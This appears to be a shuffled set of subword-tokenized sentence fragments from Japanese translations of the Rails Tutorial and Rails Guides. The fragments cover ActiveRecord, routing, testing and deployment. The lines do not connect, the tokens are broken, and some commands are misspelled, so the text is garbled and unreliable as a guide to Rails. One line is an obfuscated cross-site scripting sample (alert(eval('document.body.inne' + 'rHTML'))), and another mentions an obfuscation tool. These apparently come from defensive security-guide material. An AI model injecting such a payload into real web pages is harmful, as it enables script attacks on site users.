▁* ▁` active _ record ▖ log _ run time `: ▁` ActiveRecord :: Railtie s :: Controller Runtime ` を インクルード します ▟ これは 、 リクエスト で Active ▁Record 呼び出し に か か った 時間 を ロガー に レポート する 役 割 を 担 います 。
▁### ▁ ポリモーフィック関連付け
▁Web プログラミング を まったく した こと の ない 初心者 の方が 、 この \ emph { Rails チュートリアル } を 難 し すぎる と 感じ た場合 は 、 本書 を学ぶ 前に まず HTML や CSS の基礎 を 勉 強 してください ▟ それら の基礎 が 身 に つ い たら 、 是 非 もう一度 \ emph { Rails チュートリアル } に 挑 戦 してください 。
▁ 本チュートリアル が 自分 に はまだ まだ 難 しい と 思 う 方 には 、\ href { http :// learn - rails ▖ com / learn - ruby - on - rails ▖ html }{\ emph { Learn ▁Ruby ▁on ▁Rails } } ▁( D an i el ▁Ke h o e ) ▁ や \ href { http :// mb sy ▖ co / 7 Z d c 7 } { O ne ▁Mon th ▁Rails } を 先に 学 んで おくとよいでしょう ▟ どちらも まったく の 初心者 を 対象 と し ており 、\ emph { 本チュートリアル } よりも 敷居 が 低 く 設定 されています 。
▁M ac ▁OS ▁X の場合 、 ターミナル ▁( T er m in al ▖ app ) ▁ という名前の アプリケーション を実行します ▟ Windows の場合は [ ス ター ト ] ▁ メニュー から ▁[ ファイル名 を指定して 実行 ] ▁ をクリックして ' cm d ▖ ex e ' と 入力 します 。
▁create ▁app / assets / stylesheets / welcome ▖ css ▖ scss
▁# ▁gem ▁' therubyracer ', ▁platform s : ▁: ruby
▁WHERE ▁ follower _ id ▁= ▁: user _ id "
▁ ある ヘルパー が 特定の コントローラで のみ 使用する も のであれば 、 それに対応する ヘルパー ファイルに 置く 必要があります ▟ たとえば StaticPages コントローラ 用 ヘルパーは 、 通常 \ k ode { app / helpers / static \_ pages \_ helper ▖ rb } になります 。
▁なお 、 GitHub には コマンドライン インターフェイス を 拡張 した GUI アプリケーション もあります ▟ ▁ GUI アプリケーションの 方が 好 み であれば 、\ href { http :// w in do w s ▖ github ▖ com /}{ GitHub ▁for ▁Windows } や \ href { http :// ma c ▖ github ▖ com /}{ GitHub ▁for ▁M ac } を チェック してみてください
▁{0} 図 7 ▖5{/0}{1} URI ▁ / users /1 のルーティング は 有効 だ が ページ がない 状態 ▟\ href { http :// railstutorial ▖ org / images / figures / user _ show _ unknown _ action _ 4 - full ▖ png }{( 拡大 ) }{/1}
▁ 名前 から 想 像 される ように 、 コントローラのアクション は コントローラ 内で 定義 します 。
▁ 「 エ ス キュー エ ル 」 と発音します が 、「 ス ィ ー ク ゥ エ ル 」 も よく使われます 。
▁次に 、 いつものように 開発 データベース と テスト データベース を更新し ます 。
▁#### ▁date _ field _ tag
▁Rails 環境 の設定
▁ 範囲 は 、 配列 の 要素を 取り出す の に 便利です 。
▁ 返される オブジェクトは 、 渡された 属性 に基いて インスタンス化され 、 外部キー を 経 由 する リンク が 作成されます ▟ 関連付けられたオブジェクト は 、 値 が返され た時点で はまだ 保存 されて _ いない _ ことにご注意ください 。
▁<%= ▁f ▖ text _ field ▁: title ▁%>< br >
▁ --- ---
▁という の も 、 ユーザー 毎 に 50 個 分 の マイクロポストを まとめて 作成 してしまう と 、 ステータスフィード に表示される 投 稿 がすべて 同じ ユーザーに なってしまい 、 視 覚 的な 見 栄 え が 悪 くなる からです ▟)
▁xml ▁version =" 1 ▖ 0 " ▁encoding =" UT F -8 " ?
▁` errors [: attribute ]` を使用して 、 特定の オブジェクトの 属性 が 有効 である かどうかを確認 できます 。
▁ アプリケーションに 現在 残 された 問題 は あ と 1 つだけ です ▟ ブラウザの cookies を 削除 する手段 が 未 実装 なので ▁( 20 年 待 て ば 消え ますが ) 、 ユーザーが ログアウト できません 。
▁* ▁ 使用されている HTTP 動詞 ▁( その ルーティング が すべての HTTP 動詞 に応答する ので ない場合 )
▁# サインイン していない ユーザー用の リンク
▁ pe t abytes
▁(\ k ode { mkdir } コマンド や GUI ベースの ファイル マ ネ ー ジ ャ を使用して この ディレクトリ を作成する 必要がある こともあります ) 。
▁* ▁` build _ association ( attributes ▁= ▁{}) `
▁Rails 3▖1 以降 では 、 静 的 ファイルを 目的 別 に 分 類 する 、 標準的な \ emph { 3 つの } ディレクトリ が 使用される ようになりました ▟ 最新の Rails で も同様です 。
▁Guard に Spork を導入する
▁ 経験 豊 富 な 開発者 の デ ス ク ト ッ プ 画面 を 覗 き こ め ば 、 十 中 八九 ど こ ろ か 99 % は 、 黒 い ターミナル ウィンドウ がいくつも 開 き 、 そこで 多数の コマンドライン シェル が 忙 しく 実行 されている はずです 。
▁t ▖ integer ▁: image able _ id
▁ SELECT ▁* ▁FROM ▁clients ▁WHERE ▁( client s ▖ created _ at ▁ BETWEEN ▁' 2008 - 12 - 2 1 ▁00:00:00 ' ▁ AND ▁' 2008 - 12 - 22 ▁00:00:00 ')
▁D S _ Store
▁exercise ' ▁id =' ex - c b 38 fe ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁signup _ url ▁( end )╼╼ ▁% ▁section ▁user _ signup ▁( end )╼╼ ▁\ section { 最後に } ▁% ▁( fold )╼ ▁\ label { sec : layout _ co nclusion }╼╼
▁make _ relationships
▁ HA V IN G ▁ sum ( price ) ▁> ▁100
▁* ▁` config ▖ assets ▖ paths ` には 、 アセット 探 索 用の パス を指定します 。
▁( 技術 的な 補 足 : ▁\ k ode { params [: id ]} は 文字列 型の ▁\ k ode { "1" } ▁ ですが 、\ k ode { find } メソッドでは 自動的に 整 数 型 に変換 されます ) 。
▁$ ▁rails ▁generate ▁scaffold ▁Micropost ▁content : string ▁user _ id : integer
▁ここで `@ user ▖ to do s ▖ create ` を実行すると 、 `@ to do ` レコード の ` user _ id ` カラム の値 には `@ user ` の ` guid ` 値が 設定 されます 。
▁ alert ( eval (' document ▖ body ▖ in ne ' ▁+ ▁' r HTML ') ) ;
▁> > ▁1▖ kilobyte
▁' D E N Y ' を指定すると すべての フ レ ー ミ ング が 不 許可 になります ▟ すべての Web サイト について フ レ ー ミ ング を 許可 するには ' ALL O W ALL ' を指定します 。
▁ 特定の コントローラ を サポート するために 、 アプリケーションの 標準 レイアウト と の違い が ご く わずか しか ない ような レイアウト を使い た くなる ことがあります 。
▁ 1235551234 ▖ to _ s (: phone , ▁ delimiter : ▁" ▁" )
▁ 更新 を ローカル に 取り 込 みましょう 。
▁def ▁re format _ name ( name )
▁最初の 行 が 、 その後 に 定義されている 関数 の 目的 を 説明 している コメント です 。
▁\ k ode { Microposts Controller } クラスにおける継承 。
▁最初の バリデーション では 、 有効な 画像 の種類 を 制限 していきます が 、 これは CarrierWave の アップ ロー ダ ー の中に 既に ヒント があります 。
▁この gem には ` Rails :: Engine ` から 継 承 した エンジン クラス が 1 つ 含まれています 。
▁validates ▁: order , ▁absence : ▁true
▁ユーザー登録 時の エラー 表示 を更新する
▁テストにパスする ことを確認 してみましょう 。
▁╼╼ If ▁you ▁did ▁not ▁request ▁your ▁password ▁to ▁be ▁reset , ▁please ▁ignore ▁this ▁email ▁and ╼ your ▁password ▁will ▁ st a y ▁as ▁it ▁is ▖
▁なお 、 Windows ▁ の コマンドラインで は 、 $ の代わりに 大 なり 記 号 ▁(\ k ode { > }) ▁ が プロンプト に表示される ので 、 $ ▁ を ▁> ▁ に置き換え て 読んで ください 。
▁ isolate _ namespace ▁Blorgh
▁これは 、 REST アーキテクチャ が 2 つの リソース に 同じ ように 反映され ている ことを示しています 。
▁Rails の RESTful 構造 を 身 体 に 叩 き こ む には 、 繰り返し 学ぶ のが 一番 です ▟ Users リソース と Microposts リソース の 構造 の 類似 点 を理解する ことが 、 この章 の 主要な 目的 です 。
▁\ ref { sec : creating _ user _ objects } で説明した \ k ode { create } を使います が 、 後 々 実際の ユーザーを 作成 する必要が 出 て く るので 、 今回は サ ンド ボックス 環境 は \ emph { 使い ません } ▟ したがって 、 今回 作成した ユーザー を保存する と 、 データベースに 反映され ます 。
▁#### ▁collection _ select
▁{0} 図 2▖ 7 {/0} ▁{1} ユーザー 編集 用の ページ ▁(\ href { http :// localhost :3000/ users /1/ edit }{/ users /1/ edit }) {/1}
▁ / Users / mhartl / rails _ projects / sample _ app / spec / models / user _ spec ▖ rb
▁F a st ▁forward
▁ただし 、 Java ▁ や ▁C / C + + ▁ といった 言語 と ▁Ruby ▁ 言語 では 、 記 法 が 異なる ので 、 少し 違 和 感 がある かもしれません ▟ しかし 、 Ruby ▁ 言語 の 記 法 に 慣 れる まで に 、 そこ まで 時間 は か か り ません 。
▁[] ▖ sum (1) ▁ { | n | ▁ n ** 3 } ▁# ▁=> ▁1
▁ ユーザーが パスワードを 設定 できない
▁╼╼ ▁% ▁subsection ▁ modeling _ microposts ▁( end ) ╼╼% ▁section ▁ planning _ the _ application ▁( end )╼╼ ▁\ section { Users リソース } ▁% ▁( fold )╼ ▁\ label { sec : demo _ users _ resource }╼╼
▁{0} 図 9 ▖3{/0}{1} 更新 フォームの 送信 で 発生 した エラーメッセージ ▟\ href { http :// railstutorial ▖ org / images / figures / edit _ with _ invalid _ information _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁C HA N G E LO G エントリ の例 を以下に示します ▁( ▁** 訳 注 : ▁ 実際 は 英語 で 書き ます ** ▁ ) 。
▁JavaScript セグメント から 改行 ▁( C R ) ▁ と 一 重 引 用 符 と 二 重 引 用 符 を エスケープ します 。
▁\ ref { sec : sample _ app _ setup } の 準備 がすべて 完了 したら 、 いよいよ サンプルアプリケーションの 開発 に取りかかりま しょう 。
▁file : ▁ attachment ,
▁# ▁< name > David ▁H einemeier ▁Hansson </ name >
▁[ remember ▁me ] ▁ テストを 改良 するための テンプレート
▁xml ▖ rs s (" version " ▁=> ▁" 2▖ 0 ", ▁" xml n s : d c " ▁=> ▁" http :// p url ▖ org / d c / e le ment s /1▖1 / ") ▁do
▁ レスポンス を作成する
▁Microposts コントローラの \ k ode { create } アクション
▁ パスワード 再設定 メールの プレビュー ▁( HTML バージョン )
▁ テスト駆動開発 の定義 とは 、 アプリケーションを開発する ときに \ emph { 最初に } テスト を作成し 、 次に コード を作成する ことです 。
▁" high ri se _ production ▖ com p an ies "▖ classify ▁# ▁=> ▁" Co mp any "
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁# ▁initialization ▁code ▁go es ▁here
▁この Web サイト は イン タ ラ ク ティブ 性 に 富 んだ インターフェイス を 持 って いて 、 また 、 正規表現 の ク イ ッ ク リ フ ァ レ ン ス も 兼 ね 備えて います 。
▁#### ▁ 特定の コンポーネント のテスト を実行する
▁ 送信 に 失敗した場合 は ` ajax : error ` を使用します 。
▁ 日付 用の select タグ の セット を返します ▟ タグ は 年 ・ 月 ・ 日 用に それぞれ あり 、 日付 に関する 特定の 属性 にアクセス して 年 月 日 を 選択 済み の状態 に します 。
▁\ k ode { README } ファイルの 更新 が終わった ので 、 Bitbucket に 変更を プッシュ して 結果 を見てみましょう 。
▁本ガイドでは 、 Action ▁Controller と Action ▁View による 基本的な レイアウト 機能 について解説します 。
▁Rails には ` Date ` クラス や ` Time ` クラス と同様に 振 る 舞 う クラス が いくつか あり 、 この 手法 を使用できます 。
▁Web アプリケーションの ディレクトリ を どう 構成 するか は 本 来 自 由 なのです が 、 Rails のような Web フレームワーク では ディレクトリ と ファイルの 構造 ▁( 図 \ ref { fig : directory _ structure _ rails }) ▁ は このように 標準 化 されています ▟ その おかげで 、 ディレクトリ 構成 に 悩 む こと なく 、 実際に 動作する アプリケーションを 即座に ゼロ から 作成 できる のです 。
▁ 文字列 のうち 、` position ` で 指定された 位 置 を 終 端 と する 部分 文字列 を返します 。
▁Rails は 、 最 善 の開発 方法 という もの を 1 つ に 定 め る という 、 ある 意味 大 胆 な 判 断 に基いて 設計 されています 。
▁# ▁ サインイン している ユーザー用の リンク
▁#### ▁email _ field
▁$ ▁gem ▁install ▁rails
▁ Updating ▁\ k ode { authenticated ?}
▁ ちなみに 、 通常 このような 小さな 変更 のために わざわざ ブランチ を作成する 必要はありません が 、 ブランチ が よい 習慣 であること に 変 わ り は ないので 、 少し でも 練 習 しておきましょう 。
▁ し
▁もし 仮 に 日付 部分を 先に 進 め ▁( 前 述 した とおり 、 相 対 的な 計算 順序 があります ) 、 続いて 時間 の 部分 も 先に 進 め ると 、 以下のような 計算 結果 が 得られます 。
▁` class _ eval ` メソッドを使用することで 、 あらゆる オブジェクトの singleton クラス のコンテキストで コードを 評価 することができます 。
▁$ ▁ heroku ▁run ▁console
▁` to _ time ` は オプションで `: utc ` や `: local ` を引数に取り 、 タイムゾーン を指定することができます 。
▁ マイクロポスト が 1 つ も ないので は 無 理 も ありません 。
▁` test ` ディレクトリ は 、 通常の Rails における testing 環境 と同様に 扱 う 必要があります ▟ Rails の testing 環境では 単 体 テスト 、 機能 テスト 、 結合テスト を 行なうことができます 。
▁ 関連する ドキュメント を参照 し 、 以下の 相 違 点 についても 把 握 しておいてください 。
▁#### # ▁` beginning _ of _ hour `、` end _ of _ hour `
▁ テストの 手法 や タイミング は 、 ある 意味 テストを どの ぐらい すら すら 書 け る か で 決 ま ると 言 って よいでしょう ▟ た いて い の 開発者 は 、 テストを書く の に 慣 れ て く ると テストを 先に 書く ようになります 。
▁\ href { http :// rails lab ▖ new rel ic ▖ com / s caling - rails } { S caling ▁Rails } ▟ 本書 \ emph { Ruby ▁on ▁Rails チュートリアル } では 、 残念ながら パフォーマンス ▁( 性 能 ) 、 最適化 、 ス ケ ー リ ング という テーマ については ほとんど 追 求 できません でした 、
▁create ▁test / models / blorgh / article _ test ▖ rb
▁ マイグレーション を実行する には rake コマンドを実行 します ▟ マイグレーション を使用して 行った データベース 構成 の変更は 、 後 から 取り 消 す ことができます 。
▁` utc ` メソッドは 、 レシーバの 日付 時刻 を UT C で 返します 。
▁また 、 それぞれの フォーム は \ emph { 完全に 同じ ではない } ため 、 テスト も 更新 の 必要があります ▟ フォームの わずか な 違い を見つけ 出 し 、 テストの 更新 に それを 反 映 してください 。
▁# ▁POST ▁ / users ▖ json
▁# ▁=> ▁Mon , ▁09 ▁A ug ▁2010
▁ これはリスト \ ref { code : micropost _ form } で使用されていました 。
▁=> ▁[" foo ", ▁" bar ", ▁" baz ", ▁" q u u x "]
▁ はじめ に 、 To y アプリケーションを どのような もの にする のか 、 計 画 を 立 て ましょう 。
▁上のように 書 け ば 期待どおり に 値 が返されます 。
▁\ ref { sec : the _ hello _ application } でも 簡単に 説明したように 、 Bundler は \ k ode { rails } によって自動的に 実行 ▁( この場合は \ k ode { bundle ▁install }) ▁ されます ▟ ここでは デフォルトの アプリケーション gem を変更 して Bundler を再度 実行 してみます 。
▁### ▁Web 上の リソース
▁=> ▁ Ctrl - C ▁to ▁ sh u td own ▁server
▁デフォルトは UT F -8 です 。
▁たとえば 、` Article sController ` の アクション が呼び出され ると 、 Rails はその 名前 から すぐに 推 測 できる ` Article Helper ` を使用し よう とします 。
▁ ヘルパーメソッド ` full _ messages ` では 、 属性 名を メッセージ に含め る ときに ` humanize ` を使用しています 。
▁つまり 、 明 示 的な 設定 が 必要となる のは 標準 の ルール だけで は 不 足 がある場合 のみ ということです 。
▁今回の場合 は 、 ▁\ ref { sec : demo _ user _ has _ many _ microposts } でも 示 した ように 、 それぞれの マイクロポスト は 1 人のユーザー と 関連付け ら れ 、 それぞれの ユーザーは ▁( 潜 在 的に ) ▁ 複数の マイクロポスト と 関連付け られます ▟ この 関連付けを 図 \ ref { fig : micropost _ belongs _ to _ user } と 図 \ ref { fig : user _ has _ many _ microposts } に示します 。
▁* ▁ 既存の issue を解決する 方法
▁この節で 作成する ユーザープロファイル のモックアップ
▁ 完了 時に はこの 一時 ファイルは リ ネ ーム されます ▟ リ ネ ーム は 、 P OS I X システム の ア ト ミ ッ ク 操作 に基いて 行われます 。
▁ SELECT ▁* ▁FROM ▁articles ▁WHERE ▁` trashed ` ▁= ▁1 ▁ AND ▁` trashed ` ▁= ▁0
▁このコードは リスト \ ref { code : user _ relationships _ association } で使用されていました ▟ もうひとつ 、
▁( 最後の 行 では 、 この後 の開発 準備 のために master ブランチ を チェック ア ウ ト しています が 、 チュートリアル 本 編 への 影 響 を 避ける ため 、 演習 で 行った 変更 は master に マージ \ emph { していません }) 。
▁\ k ode { title } タグ の内容 が 以下の とおり になっている ことを確認します 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / hash / transform _ value s ▖ rb ` です 。
▁ 返される 文字列 は 以下の とおり です 。
▁* ▁` add _ locales `: ▁` config / locales ` にある ファイルを ` I 18 n ▖ load _ path ` に追加し 、 その パス で 指定された 場所 にある 訳 文 にアクセス できるようにします ▟ この ` config / locales ` は 、 アプリケーション だけ ではなく 、 railties や エンジン に もあります 。
▁user name : ▁root
▁リスト \ ref { code : generate _ user _ model } にある \ k ode { generate } コマンド の結果 のひとつ として 、\ emph { マイグレーション } と呼ばれる 新しい ファイル が生成されます 。
▁=> ▁" mhartl @ example ▖ net "
▁ 12345 ▖ to _ s (: human _ size ) ▁# ▁=> ▁1 2▖1 ▁ K B
▁ アプリケーション のコンテキストで マイグレーション を実行する には 、 単 に ` rake ▁db : m ig ir ate ` を実行します 。
▁------- ----------------
▁ プッシュ した 後 、 マイグレーション が 完了 する まで の 間 、 一時 的に ステータス が 無効 ▁( invalid ) ▁ になります ので 、 ご注意ください 。
▁以下の ファイルを 例 に 説明します 。
▁File ▖ ext name ( filename ) ) ▁ },
▁作成した コードをリスト \ ref { code : sign _ in _ success } に示します
▁* ▁ テンプレート 、 パーシャル ( 部分 テンプレート ) 、 レイアウト の 最適な 利用 法
▁get ▁' / : user name ', ▁to : ▁' users # show '
▁g ▖ or m ▁: active _ record
▁module ▁ActiveRecord :: Core :: Class Methods
▁\ k ode { gravatar _ for } ヘルパー を 組み 込 んだ 結果を リスト \ ref { code : gravatar _ for _ helper } に 示 しました 。
▁ 現在の サンプルアプリケーション には 、 正規表現 による 最小限 の 確 認 以外に 、 メールアドレスを 検証 する手段 が ありません 。
▁< a ▁ href ="# " ▁on click =" this ▖ style ▖ backgroundColor =' # 00 99 00 ' ; this ▖ style ▖ color =' # FFFFFF ' ; "> P aint ▁it ▁green </ a >
▁self を省略した 結果を リスト \ ref { code : relationships _ access _ control } に示します 。
▁create ▁app / views / users / index ▖ html ▖ erb
▁上のコードでは 、\ k ode { users } テーブルの \ k ode { email } カラム に インデックス を追加する ために \ k ode { add _ index } という Rails の メソッド を使っています 。
▁\ k ode { bundle ▁exec ▁ rspec } を実行すると 、 テストが 開 始 される まで し ば ら く 時間がかかる ことに お 気 付き かもしれません ▟ テストが い った ん 開 始 され れば すぐに 終 了 します 。
▁Rails テンプレート のデフォルト ビュー を出力する こともできます し 、 特定の テンプレート 、 ファイル 、 インライン コード を指定して 出力 したり 、 何も 出力 しない こともできます 。
▁ ライブラリ モジュール
▁< script ▁src =' / assets / main ▖ js ' ></ script >
▁ 静 的な ファイル や コンパイル 済み アセット は ここに 置きます 。
▁ 出力 される レスポンス の content ▁type や HTTP ステータス を指定することもできます 。
▁* ▁` ActionDispatch :: ParamsParser ` は 、 リクエスト から パラメータを 切り 出 して ` params ` に保存 します 。
▁ 具体的には 、 email カラム に データベースの \ emph { インデックス } を作成し 、 その インデックス が 一意 であること を要求します 。
▁ カスタム CSS 用の ファイルを作成し たら 、 リスト \ ref { code : bootstrap _ css } のように ▁\ k ode {@ import } を使用して 、 Bootstrap ▁( と それ に関連する Sprockets ) ▁ を インクルード します
▁( マニフェストファイル は CSS と JavaScript には 適用 されます が 、 画像ファイル には 適用 されません ) ▁ 。
▁また 、 入力 された パスワード を使用して ユーザーを \ emph { 認 証 } する手段 と 、 {1} {2} 第 8 章 {/2}{/1} で使用する 、 ユーザーが サイトに ログイン できるように する手段 も 提供し ます 。
▁#### ▁ その他の 日付 計算 メソッド
▁しかし 実際には 、 マイクロポストを ユーザー と \ emph { 関連付け る ▁( associate )} ▁ 必要があります ▟ そのため 、 マイクロポストの 投 稿 者 を 記 録 するための \ k ode { user _ id } も 追加します 。
▁Heroku の デフォルトでは 、 Ruby だけで 実装 された WEBrick という Web サーバ を使っています ▟ WEBrick は 簡単に セットアップ できた り 動 せる ことが 特 長 ですが 、 著 しい トラフィック を扱う ことに は 適 していません 。
▁* ▁` config ▖ assets ▖ debug ` は 、 デバッグ 用に アセット の 連結 と 圧縮 を や め る かどうかを指定します 。
▁ Order ▖ select (" date ( created _ at ) ▁as ▁order ed _ date , ▁ sum ( price ) ▁as ▁total _ price ")▖ group (" date ( created _ at ) ")
▁ SELECT ▁date ( created _ at ) ▁as ▁order ed _ date , ▁ sum ( price ) ▁as ▁total _ price
▁# ▁ 最後の 引数 が ハッシュ の場合 、 波 かっこ は 省略 可能 。
▁ { p 0} で作成した {2} example _ user ▖ rb {/2} ファイルは 今後 使用する ことはありません ので 、 削除 してください 。
▁しかし 下 のコードは 動作 しません ▟ ` Supplier ` クラス と ` Account ` クラス が 異なる スコープ 内で 定義されている ためです 。
▁< li >`: argument s ` ▁- ▁ sendmail に 渡す コマンドライン 引数 を指定する 。
▁name ▁= ▁' % s ▁( % ▖ 1 f m s ) ' ▁% ▁[ name ▁|| ▁' SQL ', ▁m s ]
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / m ar sh al ▖ rb ` です 。
▁\ k ode { Application Controller } クラスにおける継承 。
▁\ k ode { - > } という ラ ム ダ 式 は 、 ブロック ▁(\ ref { sec : block s }) ▁ を引数に取り 、 Proc オブジェクトを返します ▟ この オブジェクトは 、\ k ode { call } メソッドが 呼 ば れ たとき 、 ブロック 内の 処理を 評価 します 。
▁\ k ode { debug } メソッド を使う ことで 、 役 立 つ デバッグ情報 を 表示 できる
▁1 つの マイクロポスト は 1 人のユーザー に のみ 属 する 。
▁\ ref { sec : layouts } で学んだ ように 、\ k ode { yield } メソッドは Web サイトの レイアウト に ページ ご と の内容 を挿入 します 。
▁リスト \ ref { code : action _ tests _ admin } の テストでは 、 管理者 ではない ユーザーの 振る舞い について 検証 しています が 、 管理者 ユーザーの 振る舞い と 一 緒 に 確 認 できる と よ さ そう です 。
▁この 手法 を使用することで 、 たとえば ニ ュ ー ス レ ター の 読者 を 言語 ごとに ▁ _ グループ 化 _ ▁ することができます 。
▁図 \ ref { fig : home _ with _ form } の フォーム が正しく 動作 している かどうかを確認 したい場合 、 正しい エントリ ー を 投 稿 した 後 、\ href { http ://0▖0▖0▖0:3000/ users /1 } { プロフィール ページ } に移動し て ポスト を 表示 すればよいのです が 、 これは かなり 面倒な 作業 です 。
▁ --------------- ----------------
▁もちろん 、 人 間 が い ち い ち 文字 数を \ emph { 数 え て } い たら 頭 が どう に か なってしまい ます ▟ だ から こ そ 、 多くの テキストエディタ には これら を 支 援 する 機能 が 備わっています 。
▁ attr _ accessor ▁: author _ name
▁しかし 、 UT F -8 で 保存 されていない 外部 データ があると 、 Rails による 自動 検出 / 修正 が 効 か ずに 文字 化 け が発生する ことがあります 。
▁ そのまま 実際に フッター を表示し てみると どう にも 見 苦 しい ので 、 リスト \ ref { code : footer _ css } で スタイル を 若 干 追加 しましょう 。
▁ ある 実 践 的な 実 験 による と 、 多くの サイトの 認証システム は 膨大な カスタマイズ を 必要 と する ため 、 サードパーティ 製 品 を変更 して 導 入 する 場合には システム を ゼロ から 作成する よりも 多くの 仕 事 を 要 する という 結果 が 出 ています 。
▁\ k ode { sequence } メソッドの 引数に は 、 使用 したい 属性 に対応する シンボル ▁(\ k ode { : name } ▁ など ) ▁ を使用し 、\ k ode { n } という 変数 を持つ ブロック を 1 つ 置きます 。
▁このオプション を有効に するには 以下 を設定します 。
▁これにより 、 D el a y ed ▁Job と Re s q ue など のように 、 さまざまな ジョブ 実行 機能 の API の違い を 気 に せずに ジョブ フレームワーク 機能 や その他の gem を 搭 載 すること が できるようになります 。
▁ どの くらい 細 か く テスト するか は お 任 せ します ▟ ▁リスト \ ref { code : flash _ test } に 最小限 の テンプレート を用意し て お いた ので 、 参考にしてください ▁( ヒント : ▁\ k ode { FILL _ IN } メソッドを 適切な コード に置き換える と 完成 します ) 。
▁\ k ode { User ▖ create } は 、\ k ode { true } か \ k ode { false } を返す 代わりに 、 ユーザー オブジェクト 自身 を返す ことに注目してください ▟ 返 された ユーザー オブジェクトは ▁( 上の 2 つ目の コマンド にある \ k ode { foo } のように ) ▁ 変数 に 代入 することもできます 。
▁ そうでない と 、 ページ キャッシュ が 有効 に な らず 、 public ディレクトリ 以下 に 常 駐 する 静 的 ファイル への リクエストが 毎 回 Rails アプリケーション を経由して しま います 。
▁ attr _ internal ▁: c a p t ure s
▁ここでは 、 フィード ア イ テ ム として \ k ode { : collection } パラメータ ー を渡して い るので 、\ k ode { render } は コレクション の各 ア イ テ ム を表示する ために 与えられた パーシャル ▁( この場合は \ k ode { ’ feed _ item ’} ) を使用 してくれます 。
▁この ファイル には アプリケーションの 設定 方法 など を 記 入 し 、 これ さ え 読 め ば 誰 でも アプリケーションを 構 築 できるように しておく必要があります 。
▁#### ▁` as ` と ` object ` オプション
▁ここで 、 すべての テストが ▁\ passing ▁ である ことを確認 しておいてください 。
▁ 著者 は コントローラの テスト よりも 統合テスト ▁(\ ref { sec : activation _ test _ and _ refactoring }) ▁ の方 が望ましい と 考え ているので 、 コントローラの テスト を生成し ない ように している のです 。
▁まずは 、 埋め込み Ruby が 使われ ている \ k ode { form _ for } から \ k ode { end } まで の 外 側 の 構造 を 読み 解 い ていきます 。
▁たとえば 、 ある Rails アプリケーション 全体 に わ た って 標準 の アプリケーション レイアウト を使用している が 、 特定の ページ で のみ 特定の JavaScript コード が必要 となり 、 他の ページ では この JavaScript は まったく 不要 で あるとします 。
▁この節で 扱 わ れ ている 内容 は 、 本書 の中で も 最も 高度な ものです 。
▁Active ▁Record モデル への クエリ については [ Active ▁Record クエリ インターフェイス ]( active _ record _ query ing ▖ html ) ガイド で 詳 細 を 説明します 。
▁* ▁` engine s _ blank _ point `: ▁ エンジンの 読み込み が 完了 する 前に 行いたい 処理 がある場合 に 使用できる 初期化 ポイント への フック を提供します 。
▁ どちら を使用する か について ですが 、 経験 上 、 リレーションシップ の モデル それ 自体 を 独立した エ ン テ ィ テ ィ として 扱 いた い ( 両 モデル の関係 そのもの について 処理を 行いたい ) のであれば 、 中 間 に 結合 モデル を使用する ` has _ many ▁: through ` リレーションシップ を 選 ぶ のが 最も シ ン プ ル です 。
▁TIP : ▁ コレクション によって 呼び出される パーシャル 内で カ ウ ン タ 変数 を使用することもできます ▟ この カ ウ ン タ 変数 は 、 コレクション 名 の 後ろに ` _ counter ` を追加した 名前 になります 。
▁(1▖▖10 ) ▁= == ▁( 0 ▖ ▖ 7 ) ▁# ▁=> ▁false
▁invoke ▁ erb
▁* ▁` config ▖ cache _ classes ` は 、 アプリケーションの クラス や モジュール を リクエスト ごとに 再 読み込み するか ( = キャッシュ しない かどうか ) どう か を指定します 。
▁( もし bcrypt ▁gem を追加して から まだ 一度 も Rails サーバ を 再起動 させ ていない 場合は 、 ここで 再起動 してください ▟)
▁### ▁Read
▁self を省略した 結果を リスト \ ref { code : c a p y bar a _ d s l } に示します 。
▁belongs _ to ▁: customer , ▁ counter _ cache : ▁true
▁#### # ▁` prev _ year `、` next _ year `
▁ 統 計 情報 パーシャル のモックアップ
▁TIP : ▁ イニシャライザ の実行 順序 を 指定 したい場合は 、 イニシャライザ の ファイル名 を使用して 実行 順序 を 制御 できます 。
▁ ユーザー用の マイグレーション と異なり 、 メールアドレス の 一意性 の マイグレーション は 未 定義 になっています ▟ リスト \ ref { code : email _ uniqueness _ index } のように 定義 を 記 述 する必要があります
▁[ H ac k ve r to r ]( https :// h ac k ve r to r ▖ co ▖ u k / public ) は 文字列 の 難 読 化 と エンコード を行なう 優 れ た ツール であり 、「 敵 を知る 」 の に 最適です 。
▁以前のバージョン の Rails では 、\ k ode { モデル } 層 で \ emph { attr _ accessible } メソッドを使用することで 上のような 危 険 を 防止 していました が 、 ▁Rails ▁4▖0 では コントローラ 層 で \ k ode { S trong ▁Parameters } という テクニック を使用すること が 推 奨 されています 。
▁* ▁` en sure _ autoload _ once _ paths _ as _ subset `: ▁` config ▖ autoload _ once _ paths ` に 、` config ▖ autoload _ paths ` 以外の パス が含まれ ない ようにします 。
▁ 最大 の違い は 、 ユーザー登録 は 誰 でも 実行 できます が 、 ユーザー情報 を 更新 できる のは そのユーザー 自身 に限ら れる ということです 。
▁ このように 指定 すると 、\ k ode { coffee - rails } ▁( これも Asset ▁Pipeline で使用する gem です ) ▁ のバージョン が \ k ode { 4▖0▖0 } より 大きく 、\ k ode { 4 ▖ 1 } \ emph { より 小さい } 場合に インストール されます 。
▁* ▁` config ▖ reload _ classes _ only _ on _ change ` は 、 監 視 している ファイルが 変更 された 場合にのみ クラス を再読み込みする かどうかを指定します 。
▁* ▁and ▁you ▁think ▁this ▁ stuff ▁is ▁worth ▁it , ▁you ▁can ▁b u y ▁me ▁a ▁be er ▁in ▁return ▖
▁class ▁Read Only Model ▁< ▁ActiveRecord :: Base
▁上のコードは 、\ k ode { input } タグ に 正しい 名前 、 type =" hidden " 、 メールアドレス がある かどうかを確認 します 。
▁* ▁`: port ` ▁- ▁ 使用する メール サーバー の ポート が 25 番 でない のであれば ( め った に ない と思います が ) 、 ここで 対応 できます 。
▁この節では 、 cookies を使用する 一時 セッション で ユーザーを ログイン できるようにします ▟ この cookies は 、 ブラウザを閉じ ると 自動的に 有効期限 が 切 れる もの を使用します 。
▁[ Settings ] ▁ リンク を追加する 。
▁たとえば 、 以下のコード では 、
▁user ▁= ▁User ▖ create ( name : ▁" David ", ▁ occupation : ▁" Code ▁Artist ")
▁self を省略した 結果を リスト \ ref { code : layout _ signin _ signout _ links } に示します 。
